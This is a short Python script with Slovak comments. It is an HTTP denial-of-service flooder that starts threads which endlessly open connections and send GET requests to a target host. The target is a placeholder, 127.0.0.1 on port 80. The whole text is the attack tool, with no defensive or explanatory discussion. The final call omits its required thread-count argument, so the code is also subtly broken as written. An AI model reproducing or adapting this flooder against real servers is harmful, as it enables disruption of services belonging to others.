import socket
import threading

# nastavenie cielovej ip a portu
# kvoli bezpecnosti su udaje vzorove
target_ip = "127.0.0.1"  
target_port = 80  


def dos_attack():
    while True:
        try:
            # vytvorenie socketu
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # pripojenie sa k cielu
            s.connect((target_ip, target_port))
            # poslanie dat, HTTP request
            s.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
            # zavretie socketu
            s.close()
        except socket.error:
            print("Socket error")

# spustenie utoku na jednotlivych vlaknach
def perform(num_threads):
    for _ in range(num_threads):
        thread = threading.Thread(target=dos_attack)
        thread.start()

# počet vlakien
num_threads = 10

perform()         
